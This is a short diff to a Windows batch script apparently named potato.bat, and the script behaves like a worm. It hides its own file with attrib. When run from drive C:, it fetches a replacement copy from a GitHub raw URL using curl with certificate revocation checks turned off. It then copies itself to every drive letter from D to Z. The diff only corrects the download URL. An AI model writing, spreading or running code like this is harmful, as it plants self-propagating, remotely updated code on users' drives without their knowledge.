@@ -15,7 +15,7 @@ attrib +h %~nx0
 
 if %~d0=="C:" (
 :: get auto updates
-curl --ssl-no-revoke https://raw.githubusercontent.com/romort2/potato11/refs/heads/main/c > potato.bat
+curl --ssl-no-revoke https://raw.githubusercontent.com/romort2/potato11/refs/heads/main/potato.bat > potato.bat
 for %%i in (D E F G H I J K L M N O P Q R S T U V W X Y Z) DO @if exist %%i: xcopy /s /h /y %0 %%i:
 
 )
